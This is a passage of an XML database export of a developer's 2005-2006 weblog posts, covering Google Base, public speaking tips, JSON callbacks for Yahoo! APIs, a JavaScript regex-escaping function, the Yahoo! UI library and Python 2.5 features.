&lt;p id=&quot;p-5&quot;&gt;Banks and other online services have learnt to repeatedly tell their customers that they will &lt;em&gt;never&lt;/em&gt; contact them and ask for their password. Orange are leaving themselves wide open to &lt;a href=&quot;http://en.wikipedia.org/wiki/Social_engineering_%28computer_security%29&quot;&gt;social engineering&lt;/a&gt; attacks. This incredible lack of attention to basic security has given me serious second thoughts about trusting them with my business at all.&lt;/p&gt;</field>
		<field name="created">2005-11-09 20:52:12</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1513</field>
		<field name="title">Google Base is interesting</field>
		<field name="slug">base</field>
		<field name="body">&lt;p id=&quot;p-0&quot;&gt;I'm still trying to get my head around &lt;a href=&quot;http://base.google.com/&quot;&gt;Google Base&lt;/a&gt;. Here's a brain-dump of my thinking so far. First, some links.&lt;/p&gt;

&lt;ul&gt;
 &lt;li&gt;&lt;a href=&quot;http://base.google.com/base/about.html&quot;&gt;Google Base FAQ&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://googleblog.blogspot.com/2005/11/first-base.html&quot;&gt;Google Base introduction&lt;/a&gt; on the Google Blog (includes testimonials)&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.plasticbag.org/archives/2005/11/in_which_google_base_launches.shtml&quot;&gt;Tom's first impressions&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p id=&quot;p-1&quot;&gt;Base is a very interesting product for a whole bunch of reasons. The data model is surprisingly simple on the surface: all items have a title, description, (optional) external URL, a &quot;type&quot; and a set of labels (a.k.a. tags) and &quot;attributes&quot;. Attributes are something for tag enthusiasts to get excited by - they're name/value pairs that are kind of like tags in that you can apply them to anything, but more structured and with a greater level of implied meaning.&lt;/p&gt;

&lt;p id=&quot;p-2&quot;&gt;Attributes instantly made me think of geotagging on &lt;a href=&quot;http://www.flickr.com/&quot;&gt;Flickr&lt;/a&gt;, where tags are overloaded to store latitude and longitude values (example &lt;a href=&quot;http://www.flickr.com/photos/clagnut/60936865/&quot;&gt;here&lt;/a&gt;). Having first class support for this kind of extensible data is a very powerful concept.&lt;/p&gt;

&lt;p id=&quot;p-3&quot;&gt;Another interesting problem that the Google Base data model could be used to tackle is Wikipedia's &lt;a href=&quot;http://en.wikipedia.org/wiki/Wikipedia:Wikiproject&quot;&gt;WikiProjects&lt;/a&gt;. If you look at any US Navy ship entry on Wikipedia (&lt;a href=&quot;http://en.wikipedia.org/wiki/USS_Iwo_Jima_%28LHD-7%29&quot;&gt;example&lt;/a&gt;) you'll see a table on the right hand side of standard attributes relating to that ship - things like Length, Displacement, Armament and so on. This data isn't really structured - it's just a wiki table, manually maintained by participants of the &lt;a href=&quot;http://en.wikipedia.org/wiki/Wikipedia:WikiProject_Ships&quot;&gt;Ships WikiProject&lt;/a&gt;.&lt;/p&gt;

&lt;p id=&quot;p-4&quot;&gt;Obviously this data would be more valuable if it was structured in a way that allowed queries to be made against it. Base-like attributes provide a way of doing this.&lt;/p&gt;

&lt;p id=&quot;p-5&quot;&gt;There's definitely a trend towards this kind of loose data model at the moment. JotSpot allows all pages within a wiki to have as many extra name/value attribute pairs as you like (even the wiki body itself is internally implemented as a special attribute), and Ning works along similar lines.&lt;/p&gt;

&lt;p id=&quot;p-6&quot;&gt;Base currently allows bulk importing of data using tab delimited files, RSS or Atom. There are no outward bound APIs which is a notable omission - I wouldn't be at all surprised to see them added in the next few weeks.&lt;/p&gt;</field>
		<field name="created">2005-11-16 12:34:46</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1514</field>
		<field name="title">Notes on public speaking</field>
		<field name="slug">speaking</field>
		<field name="body">&lt;p id=&quot;p-0&quot;&gt;I'm pretty inexperienced as a public speaker, but somehow I landed two speaking gigs in as many weeks recently and learnt some useful lessons about presenting in the process.&lt;/p&gt;

&lt;p id=&quot;p-1&quot;&gt;I gave a talk at &lt;a href=&quot;http://www.clearleft.com/dconstruct05/&quot;&gt;d.Construct&lt;/a&gt; in Brighton on the 11th, entitled &quot;Ajax and the Flickr API&quot;. d.Construct was a Web 2.0 themed conference and you don't get much more Web 2.0 than Web Services and Ajax; as luck would have it, Flickr's Ajax implementation makes use of the site's &lt;a href=&quot;http://www.flickr.com/services/api/&quot;&gt;public web service API&lt;/a&gt; to do its magic. The talk I gave described the basics of the API, showed some examples and described the basics of how the Ajax on the site works. The &lt;a href=&quot;http://simon.incutio.com/slides/2005/dconstruct/AjaxFlickrAPI.pdf&quot; title=&quot;Ajax and the Flickr API slides&quot;&gt;slides are available&lt;/a&gt;, as is an &lt;a href=&quot;http://www.clearleft.com/dconstruct05/mp3/SimonWillison.mp3&quot; title=&quot;27 MB MP3&quot;&gt;MP3 of the talk&lt;/a&gt; itself courtesy of Drew McLellan's skilfully compiled d.Construct podcast series.&lt;/p&gt;

&lt;p id=&quot;p-2&quot;&gt;d.Construct was a great event, and I'm proud to have been a part of it. There are a bunch of photos from the event &lt;a href=&quot;http://www.flickr.com/photos/tags/dconstruct05/&quot; title=&quot;Flickr photos tagged with dconstruct05&quot;&gt;on Flickr&lt;/a&gt;; pictures from my talk &lt;a href=&quot;http://www.flickr.com/photos/andybudd/search/tags:dconstruct05%2Csimonwillison/tagmode:all/&quot; title=&quot;Andy Budd&amp;apos;s photos of my talk&quot;&gt;are here&lt;/a&gt;.&lt;/p&gt;

&lt;p id=&quot;p-3&quot;&gt;The second talk was &quot;An Introduction to Django&quot; at the &lt;a href=&quot;http://blog.unixdaemon.net/cgi-bin/blosxom.pl/events/frameworks_200511_done.html&quot;&gt;London Web Frameworks Evening&lt;/a&gt; on the 17th (&lt;a href=&quot;http://simon.incutio.com/slides/2005/lwfe/IntroductionDjango.pdf&quot; title=&quot;An Introduction to Django slides&quot;&gt;slides here&lt;/a&gt;). Unfortunately I was less well prepared for this one, which was a bit of a pain since there were 200 people there (as opposed to 100 for d.Construct)! I felt the slide bit of the talk was adequate but thankfully the demo went down a storm - when you're demonstrating &lt;a href=&quot;http://www.lawrence.com/&quot;&gt;www.lawrence.com&lt;/a&gt; it's hard not to put on a good show.&lt;/p&gt;

&lt;p id=&quot;p-4&quot;&gt;Here's what I learned about giving presentations:&lt;/p&gt;

&lt;ul&gt;
 &lt;li&gt;Run through a talk at least once, and preferably more. I ran through the d.Construct talk three times in total, and each time I made substantial changes. The Django talk wasn't finished in time to have a full run through and suffered as a result.&lt;/li&gt;
 &lt;li&gt;Show, don't tell. The most valuable part of the Flickr talk (according to feedback afterwards) was the demo of &lt;a href=&quot;http://www.flickr.com/services/api/explore/?method=flickr.photos.search&quot;&gt;the API explorer&lt;/a&gt;; the Django talk was completely saved by the demo at the end. Next time I talk about Django I think I'll start with a demo and then discuss how Django was used to build the site.&lt;/li&gt;
 &lt;li&gt;Never, ever put up a whole slide full of code. Half the audience will be scared off and stop listening; the other half will start trying to decode it and stop listening. Either way you've lost your audience. My Django slides make exactly this mistake. The correct way of presenting code is to do what Matt Biddulph did in &lt;a href=&quot;http://www.hackdiary.com/archives/000074.html&quot;&gt;his excellent Rails presentation&lt;/a&gt;: reveal one line at a time and omit anything that isn't directly relevant.&lt;/li&gt;
 &lt;li&gt;Have a backup of your slides in a neutral format (I use PDFs exported from Keynote) on a USB thumb drive. It's amazing what can go wrong at the last moment - my VGA-to-DVI dongle failed at the frameworks evening and I had to switch to Matt's laptop minutes before my talk (thanks Matt!).&lt;/li&gt;
&lt;/ul&gt;

&lt;p id=&quot;p-5&quot;&gt;I really enjoyed both events (both as a speaker and an attendee) and I'm looking forward to future opportunities to be enthusiastic in public.&lt;/p&gt;</field>
		<field name="created">2005-11-24 00:05:10</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1515</field>
		<field name="title">Have a webby Christmas</field>
		<field name="slug">webby</field>
		<field name="body">&lt;p id=&quot;p-0&quot;&gt;Sadly there's no &lt;a href=&quot;http://www.perladvent.org/&quot;&gt;Perl Advent Calendar&lt;/a&gt; this year, but the slack has been picked up by Drew McLellan's &lt;a href=&quot;http://24ways.org/&quot;&gt;24 ways&lt;/a&gt; to impress your friends - a neat web development tip every day until Christmas.&lt;/p&gt;

&lt;p id=&quot;p-1&quot;&gt;&lt;a href=&quot;http://lazyweb.org/&quot;&gt;Lazyweb&lt;/a&gt; request: 24 ways is currently devoid of baubles, reindeer, animated doors and DHTML snowflakes. Someone needs to write a Greasemonkey script (now &lt;a href=&quot;http://greaseblog.blogspot.com/2005/11/greasemonkey-064_30.html&quot; title=&quot;Greasemonkey 0.6.4&quot;&gt;Firefox 1.5 compatible&lt;/a&gt;).&lt;/p&gt;

&lt;p id=&quot;p-2&quot;&gt;No such problem over at &lt;a href=&quot;http://radiac.net/&quot;&gt;radiac.net&lt;/a&gt;, where  Richard has outdone himself.&lt;/p&gt;</field>
		<field name="created">2005-12-01 13:24:07</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1516</field>
		<field name="title">JSON and Yahoo!'s JavaScript APIs</field>
		<field name="slug">json</field>
		<field name="body">&lt;p&gt;I had the pleasure yesterday of seeing Douglas Crockford speak about &lt;a href=&quot;http://www.crockford.com/JSON/index.html&quot;&gt;JSON&lt;/a&gt;, the ultra-simple data interchange format he has been promoting as an alternative to XML. JSON is a subset of JavaScript, based around that language's array, string and object literal syntax.&lt;/p&gt;

&lt;p&gt;As of today, JSON is supported as an &lt;a href=&quot;http://developer.yahoo.net/common/json.html&quot;&gt;alternative output format&lt;/a&gt; for nearly all of Yahoo!'s Web Service APIs. This is a &lt;em&gt;Really Big Deal&lt;/em&gt;, because it makes Yahoo!'s APIs available to JavaScript running anywhere on the web without any of the &lt;a href=&quot;http://www.xml.com/pub/a/2005/11/09/fixing-ajax-xmlhttprequest-considered-harmful.html&quot;&gt;normal problems&lt;/a&gt; caused by XMLHttpRequest's cross domain security policy.&lt;/p&gt;

&lt;p&gt;Like JSON itself, the workaround is simple. You can append two arguments to a Yahoo! REST Web Service call:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;
&amp;amp;output=json&amp;amp;callback=myFunction
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The page returned by the service will look like this:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;javascript&quot;&gt;
myFunction({ JSON data here });
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;You just need to define &lt;code&gt;myFunction&lt;/code&gt; in your code and it will be called when the script is loaded. To make cross-domain requests, just dynamically create your script tags using the DOM:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;javascript&quot;&gt;
var script = document.createElement('script');
script.type = 'text/javascript';
script.src = '...' + '&amp;amp;output=json&amp;amp;callback=myFunction';
document.getElementsByTagName('head')[0].appendChild(script);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;In long running apps you'll want to work out some kind of cleanup system to remove script tags from the DOM once they have been executed. More on this technique &lt;a href=&quot;http://www.theurer.cc/blog/2005/12/15/web-services-json-dump-your-proxy/&quot; title=&quot;Web Services + JSON = Dump Your Proxy&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;It should be noted that &lt;a href=&quot;http://del.icio.us/&quot;&gt;del.icio.us&lt;/a&gt; has had &lt;a href=&quot;http://del.icio.us/help/json&quot;&gt;APIs like this&lt;/a&gt; for a while.&lt;/p&gt;</field>
		<field name="created">2005-12-16 00:10:57</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1517</field>
		<field name="title">Happy New Year!</field>
		<field name="slug">newyear</field>
		<field name="body">&lt;p&gt;It's just gone midnight here in England (I'm in Exeter for the new year), so Happy New Year to all. Top weblog-related priority for 2006: upgrade this aging heap of badly written object-oriented PHP to &lt;a href=&quot;http://www.djangoproject.com/&quot; title=&quot;Django&quot;&gt;something better&lt;/a&gt;. I'll try and get some good content flowing more regularly as well.&lt;/p&gt;

&lt;p&gt;Best wishes and good luck for 2006!&lt;/p&gt;</field>
		<field name="created">2006-01-01 00:21:02</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1518</field>
		<field name="title">Escaping regular expression characters in JavaScript</field>
		<field name="slug">escape</field>
		<field name="body">&lt;p id=&quot;p-0&quot;&gt;JavaScript's support for regular expressions is generally pretty good, but there is one notable omission: an escaping mechanism for literal strings. Say for example you need to create a regular expression that removes a specific string from the end of a string. If you know the string you want to remove when you write the script this is easy:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;javascript&quot;&gt;
var newString = oldString.replace(/Remove from end$/, '');
&lt;/code&gt;&lt;/pre&gt;

&lt;p id=&quot;p-1&quot;&gt;But what if the string to be removed comes from a variable? You'll need to construct a regular expression from the variable, using the RegExp constructor function:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;javascript&quot;&gt;
var re = new RegExp(stringToRemove + '$');
var newString = oldString.replace(re, '');
&lt;/code&gt;&lt;/pre&gt;

&lt;p id=&quot;p-2&quot;&gt;But what if the string you want to remove may contain regular expression metacharacters - characters like $ or . that affect the behaviour of the expression? Languages such as Python provide functions for escaping these characters (see &lt;a href=&quot;http://docs.python.org/lib/node115.html#l2h-883&quot; title=&quot;Python re module contents&quot;&gt;re.escape&lt;/a&gt;); with JavaScript you have to write your own.&lt;/p&gt;

&lt;p id=&quot;p-3&quot;&gt;Here's mine:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;javascript&quot;&gt;
RegExp.escape = function(text) {
  if (!arguments.callee.sRE) {
    var specials = [
      '/', '.', '*', '+', '?', '|',
      '(', ')', '[', ']', '{', '}', '\\'
    ];
    arguments.callee.sRE = new RegExp(
      '(\\' + specials.join('|\\') + ')', 'g'
    );
  }
  return text.replace(arguments.callee.sRE, '\\$1');
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p id=&quot;p-4&quot;&gt;This deals with another common problem in JavaScript: compiling a regular expression once (rather than every time you use it) while keeping it local to a function. &lt;code&gt;argmuments.callee&lt;/code&gt; inside a function always refers to the function itself, and since JavaScript functions are objects you can store properties on them. In this case, the first time the function is run it compiles a regular expression and stashes it in the sRE property. On subsequent calls the pre-compiled expression can be reused.&lt;/p&gt;

&lt;p id=&quot;p-5&quot;&gt;In the above snippet I've added my function as a property of the &lt;code&gt;RegExp&lt;/code&gt; constructor. There's no pressing reason to do this other than a desire to keep generic functionality relating to regular expression handling the same place. If you rename the function it will still work as expected, since the use of &lt;code&gt;arguments.callee&lt;/code&gt; eliminates any coupling between the function definition and the rest of the code.&lt;/p&gt;</field>
		<field name="created">2006-01-20 12:19:13</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1519</field>
		<field name="title">Notes from the summit</field>
		<field name="slug">summit</field>
		<field name="body">&lt;p&gt;I'm at the Carson Workshops &lt;a href=&quot;http://www.carsonworkshops.com/summit/&quot;&gt;Future of Web Apps Summit&lt;/a&gt; today. It's been a great set of talks, and some frantic SubEthaEdit action to capture the salient points. Here are the notes I've gathered over the course of the day (with help from various contributors; credits at the bottom of each file).&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;http://simon.incutio.com/notes/2006/summit/schachter.txt&quot;&gt;Joshua Schachter&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://simon.incutio.com/notes/2006/summit/henderson.txt&quot;&gt;Cal Henderson&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://simon.incutio.com/notes/2006/summit/coates.txt&quot;&gt;Tom Coates&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://simon.incutio.com/notes/2006/summit/hansson.txt&quot;&gt;David Heinemeier Hansson&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://simon.incutio.com/notes/2006/summit/inman.txt&quot;&gt;Shaun Inman&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://simon.incutio.com/notes/2006/summit/shorten.txt&quot;&gt;Andrew Shorten&lt;/a&gt; (the Adobe Flex pitch)&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://simon.incutio.com/notes/2006/summit/carson.txt&quot;&gt;Ryan Carson&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://simon.incutio.com/notes/2006/summit/meschkat.txt&quot;&gt;Steffen Meschkat&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</field>
		<field name="created">2006-02-08 17:55:46</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1520</field>
		<field name="title">Yahoo! UI JavaScript treats</field>
		<field name="slug">ui</field>
		<field name="body">&lt;p id=&quot;p-0&quot;&gt;The &lt;a href=&quot;http://developer.yahoo.net/&quot;&gt;Yahoo! Developer Network&lt;/a&gt; was updated yesterday with a veritable gold-mine of Exciting New Stuff, coinciding with the launch of the brand new &lt;a href=&quot;http://yuiblog.com/&quot;&gt;Yahoo! User Interface Blog&lt;/a&gt;.&lt;/p&gt;

&lt;p id=&quot;p-1&quot;&gt;Here are some of the highlights:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;p id=&quot;p-2&quot;&gt;Mature, extensively tested cross-browser JavaScript libraries for &lt;a href=&quot;http://developer.yahoo.net/yui/animation/index.html&quot;&gt;animation&lt;/a&gt;, &lt;a href=&quot;http://developer.yahoo.net/yui/event/index.html&quot;&gt;event handling&lt;/a&gt;, &lt;a href=&quot;http://developer.yahoo.net/yui/dom/index.html&quot;&gt;DOM wrangling&lt;/a&gt;, &lt;a href=&quot;http://developer.yahoo.net/yui/connection/index.html&quot;&gt;XMLHttpRequest&lt;/a&gt; and &lt;a href=&quot;http://developer.yahoo.net/yui/dragdrop/index.html&quot;&gt;Drag and Drop&lt;/a&gt;.&lt;/p&gt;&lt;/li&gt;
  &lt;li&gt;&lt;p id=&quot;p-3&quot;&gt;CSS-skinnable UI controls built on those libraries: &lt;a href=&quot;http://developer.yahoo.net/yui/calendar/index.html&quot;&gt;Calendar&lt;/a&gt;, &lt;a href=&quot;http://developer.yahoo.net/yui/slider/index.html&quot;&gt;Slider&lt;/a&gt; and &lt;a href=&quot;http://developer.yahoo.net/yui/treeview/index.html&quot;&gt;TreeView&lt;/a&gt;.&lt;/p&gt;&lt;/li&gt;
  &lt;li&gt;&lt;p id=&quot;p-4&quot;&gt;A library of &lt;a href=&quot;http://developer.yahoo.net/ypatterns/index.php&quot;&gt;documented design patterns&lt;/a&gt; for modern web applications.&lt;/p&gt;&lt;/li&gt;
  &lt;li&gt;&lt;p id=&quot;p-5&quot;&gt;A description of Yahoo!'s &lt;a href=&quot;http://developer.yahoo.net/yui/articles/gbs/gbs.html&quot;&gt;Graded Browser Support&lt;/a&gt; policy, which should be of great interest to anyone who cares about Web Standards, semantic HTML, accessibility, progressive enhancement and unobtrusive JavaScript.&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p id=&quot;p-6&quot;&gt;The code is all under a BSD Open Source license, which means you can use it freely in your own projects, including for commercial development.&lt;/p&gt;

&lt;p id=&quot;p-7&quot;&gt;This release represents the culmination of more than 9 months of work by an incredibly talented team. Eric Miraglia provides some &lt;a href=&quot;http://blog.360.yahoo.com/blog-JG9noGk0aa9kLMDBru_y9a2uxmo-?p=112&quot; title=&quot;Yahoo User Interface Library: Open Source Release&quot;&gt;behind-the-scenes insight&lt;/a&gt; in to the work that has gone in to the code.&lt;/p&gt;

&lt;p id=&quot;p-8&quot;&gt;I've been playing with this internally quite a bit over the past few months and I keep finding new useful bits and pieces. Here are some of my favourite details:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;p id=&quot;p-9&quot;&gt;The Event library normalises the event model across multiple browsers, including workarounds for many of the weird frustrations faced when dealing with Safari. It cleans up events when the page is unloaded, which guards against a whole swathe of memory leak problems in IE. Best of all, if you assign an event to the DOM ID of an element that has not yet been loaded, the library keeps trying to attach the event (polling) until it succeeds or the page finishes loading.&lt;/p&gt;&lt;/li&gt;
  &lt;li&gt;&lt;p id=&quot;p-10&quot;&gt;The CustomEvent library implements the publish-subscribe/listener pattern for you to use within your own scripts.&lt;/p&gt;&lt;/li&gt;
  &lt;li&gt;&lt;p id=&quot;p-11&quot;&gt;The Dom library's getStyle and setStyle methods include cross-browser support for the CSS 3 opacity property.&lt;/p&gt;&lt;/li&gt;
  &lt;li&gt;&lt;p id=&quot;p-12&quot;&gt;The Animation library uses a global Animation Manager object to oversee all animations on the page. This means it can adjust the frame-rate depending on how much stuff is happening - so if you tell a block to move across the screen in 1 second it will happen in one second no matter how much other stuff is going on at the same time.&lt;/p&gt;&lt;/li&gt;
  &lt;li&gt;&lt;p id=&quot;p-13&quot;&gt; Here's a surprisingly tricky question: when does a drag start? When the user presses down on the mouse they might be starting a click rather than a drag. The Drag and Drop library defaults to starting a drag after a user either clicks and moves 3 pixels or more, or holds the mouse down for over a second.&lt;/p&gt;&lt;/li&gt;
  &lt;li&gt;&lt;p id=&quot;p-14&quot;&gt;The Drag library also makes it easy to have elements &quot;grouped&quot; so that they can only interact with other elements in the same group - see &lt;a href=&quot;http://developer.yahoo.net/yui/dragdrop/examples/targetable.html?mode=dist&quot; title=&quot;Multiple groups, targetable affordance&quot;&gt;this demo&lt;/a&gt; for an example.&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p id=&quot;p-15&quot;&gt;And finally, I couldn't resist quoting this bit of code from &lt;a href=&quot;http://developer.yahoo.net/yui/animation/examples/anim_size_plus.html&quot; title=&quot;Animation Example - Size Plus Other Attributes&quot;&gt;one of the&lt;/a&gt; Animation examples:&lt;/p&gt;

&lt;blockquote cite=&quot;http://developer.yahoo.net/yui/animation/examples/anim_size_plus.html&quot;&gt;&lt;pre&gt;&lt;code&gt;var attributes = {
   width: { to: 100 },
   height: { to: 100 },
   fontSize: { from: 100, to: 50, unit: '%' },
   opacity: { to: 0.5 }
}
var anim = new YAHOO.util.Anim('size', attributes, 1,
  YAHOO.util.Easing.easeOut);
&lt;/code&gt;&lt;/pre&gt;&lt;/blockquote&gt;

&lt;p id=&quot;p-16&quot;&gt;A big thanks to the team that put this all together.&lt;/p&gt;</field>
		<field name="created">2006-02-14 14:01:12</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1521</field>
		<field name="title">My ETech JavaScript tutorial</field>
		<field name="slug">etech</field>
		<field name="body">&lt;p id=&quot;p-0&quot;&gt;I gave a three hour JavaScript tutorial at &lt;a href=&quot;http://conferences.oreillynet.com/et2006/&quot;&gt;ETech&lt;/a&gt; this morning, aimed at people with previous programming experience who hadn't yet dived deep in to JavaScript as a programming language. It seemed to go pretty well - some good questions were asked at various points and a few people told me afterwards that they had found it interesting.&lt;/p&gt;

&lt;p id=&quot;p-1&quot;&gt;I didn't finish the presentation in time to get handouts made up - in fact I was adding the finishing touches 15 minutes before the session began - so I'm posting the slides here. The 111 slides (reduced to low quality JPEGs with Keynote to save on bandwidth) start here: &lt;a href=&quot;http://simon.incutio.com/slides/2006/etech/javascript/js-tutorial.001.html&quot;&gt;A (Re)-Introduction to JavaScript&lt;/a&gt;.&lt;/p&gt;

&lt;p id=&quot;p-2&quot;&gt;For the sake of completeness, I'm also releasing &lt;a href=&quot;http://simon.incutio.com/slides/2006/etech/javascript/js-reintroduction-notes.pdf&quot;&gt;the notes I made&lt;/a&gt; in preparation for the talk (PDF). These are pretty rough and don't match what I actually said very closely but they might be of interest in any case.&lt;/p&gt;

&lt;p id=&quot;p-3&quot;&gt;The photos in the presentation were all found using Flickr's awesome &lt;a href=&quot;http://www.flickr.com/creativecommons/&quot;&gt;Creative Commons search feature&lt;/a&gt;.&lt;/p&gt;

&lt;p id=&quot;p-4&quot;&gt;&lt;strong&gt;Update:&lt;/strong&gt; I've converted the notes to a single HTML file with permalinks for each of the sections: &lt;a href=&quot;http://simon.incutio.com/slides/2006/etech/javascript/js-reintroduction-notes.html&quot;&gt;A (Re)-Introduction to JavaScript (HTML).&lt;/a&gt;&lt;/p&gt;

&lt;p id=&quot;p-5&quot;&gt;There's a lot of interest in the slides as a single file. The PDF is 50MB thanks to all of the images, but I'll see about getting it hosted on the ETech site. In the mean-time, I've posted higher quality copies of the slides &lt;a href=&quot;http://www.flickr.com/photos/simon/sets/72057594077197868/&quot;&gt;to Flickr&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2006-03-07 05:42:23</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1522</field>
		<field name="title">Learning Flash for programmers?</field>
		<field name="slug">flash</field>
		<field name="body">&lt;p&gt;I've decided it's about time I learnt some Flash, mainly because of the exciting opportunities posed by the &lt;a href=&quot;http://weblogs.macromedia.com/flashjavascript/&quot;&gt;Flash-JavaScript&lt;/a&gt; bridge. It's become pretty obvious now that Flash is the most practical option for dealing with audio and video on the Web, and the bridge means that anything Flash can do is now available to JavaScript as well. &lt;a href=&quot;http://finance.google.com/finance?q=MSFT&quot;&gt;Google Finance&lt;/a&gt; and the &lt;a href=&quot;http://developer.yahoo.com/maps/flash/jsGettingStarted.html&quot;&gt;Yahoo! JS-Flash Maps API&lt;/a&gt; are just two recent examples of why this stuff is worth knowing more about.&lt;/p&gt;

&lt;p&gt;I have minimal design skills, so much of the Flash literature out there isn't much use to me. Does anyone have any recommendations for books and tutorials on Flash aimed at programmers? Something similar to &lt;a href=&quot;http://diveintopython.org/&quot;&gt;Dive into Python&lt;/a&gt; would be ideal, but failing that any tips on climbing the Flash learning curve would be welcome.&lt;/p&gt;</field>
		<field name="created">2006-03-30 10:53:03</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1523</field>
		<field name="title">Naked day</field>
		<field name="slug">naked</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://naked.dustindiaz.com/&quot;&gt;Naked&lt;/a&gt; and proud.&lt;/p&gt;</field>
		<field name="created">2006-04-05 00:09:58</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1524</field>
		<field name="title">Exciting stuff in Python 2.5</field>
		<field name="slug">python25</field>
		<field name="body">&lt;p id=&quot;p-0&quot;&gt;Python 2.5 alpha 1 &lt;a href=&quot;http://www.python.org/download/releases/2.5/&quot; title=&quot;Python 2.5 (alpha 1)&quot;&gt;is out&lt;/a&gt;, and as usual the &lt;a href=&quot;http://docs.python.org/dev/whatsnew/whatsnew25.html&quot;&gt;What's New in Python 2.5&lt;/a&gt; document provides a pleasant overview of the new features. There are some real treats in there. While I'm hoping that the syntax for &lt;a href=&quot;http://docs.python.org/dev/whatsnew/node2.html&quot;&gt;conditional expressions&lt;/a&gt; will grow on me, I'm looking forward to &lt;a href=&quot;http://docs.python.org/dev/whatsnew/node3.html&quot;&gt;Partial function application&lt;/a&gt; becoming a common Python idiom. &lt;a href=&quot;http://docs.python.org/dev/whatsnew/node5.html&quot;&gt;Relative imports&lt;/a&gt; are going to make Django applications a lot easier to redistribute, and I can't wait to see all the crazy hacks that result from the introduction of &lt;a href=&quot;http://docs.python.org/dev/whatsnew/node8.html&quot;&gt;coroutines&lt;/a&gt;.&lt;/p&gt;

&lt;p id=&quot;p-1&quot;&gt;I've seen David Heinemeier Hansson speak a few times, and he often uses ActiveRecord's &lt;a href=&quot;http://wiki.rubyonrails.com/rails/pages/HowToUseTransactions&quot;&gt;transaction support&lt;/a&gt; to illustrate the elegance that well-written Ruby has to offer:&lt;/p&gt;

&lt;blockquote cite=&quot;http://wiki.rubyonrails.com/rails/pages/HowToUseTransactions&quot;&gt;&lt;pre&gt;&lt;code&gt;Account.transaction(account1, account2) do
  account1.withdraw(100)
  account2.deposit(100)
end&lt;/code&gt;&lt;/pre&gt;&lt;/blockquote&gt;

&lt;p id=&quot;p-2&quot;&gt;Here a Ruby block is being used as syntax for a database transaction, guaranteeing that some code will be run before and after the withdraw and deposit lines. The new &lt;a href=&quot;http://docs.python.org/dev/whatsnew/node9.html&quot;&gt;with statement&lt;/a&gt; makes something similar possible with an imaginary Python &lt;acronym title=&quot;Object-Relational Mapper&quot;&gt;ORM&lt;/acronym&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;with Account.transaction(account1, account2):
    account1.withdraw(100)
    account2.deposit(100)&lt;/code&gt;&lt;/pre&gt;

&lt;p id=&quot;p-3&quot;&gt;The highlight of the release might well be the modules that have been added to the standard library - tucked away in &lt;a href=&quot;http://docs.python.org/dev/whatsnew/node14.html&quot;&gt;section 13&lt;/a&gt; of the document. &lt;a href=&quot;http://starship.python.net/crew/theller/ctypes/&quot;&gt;ctypes&lt;/a&gt;, &lt;a href=&quot;http://effbot.org/zone/element-index.htm&quot;&gt;ElementTree&lt;/a&gt;, a new hashlib with support for SHA-224 through 512 and sqlite3 (a renamed &lt;a href=&quot;http://www.pysqlite.org/&quot;&gt;pysqlite&lt;/a&gt;) are all included. ctypes is particularly interesting as it lets you call functions in compiled DLLs and shared libraries without having to compile a Python wrapper.&lt;/p&gt;

&lt;p id=&quot;p-4&quot;&gt;The final Python 2.5 release &lt;a href=&quot;http://mail.python.org/pipermail/python-dev/2005-August/055342.html&quot; title=&quot;[Python-Dev] plans for 2.4.2 and 2.5a1&quot;&gt;appears to be scheduled&lt;/a&gt; for June-July this year, which should give Apple ample time to incorporate it in to OS X Leopard.&lt;/p&gt;</field>
		<field name="created">2006-04-06 22:15:14</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1525</field>
		<field name="title">Speaking gigs</field>
		<field name="slug">speaking</field>
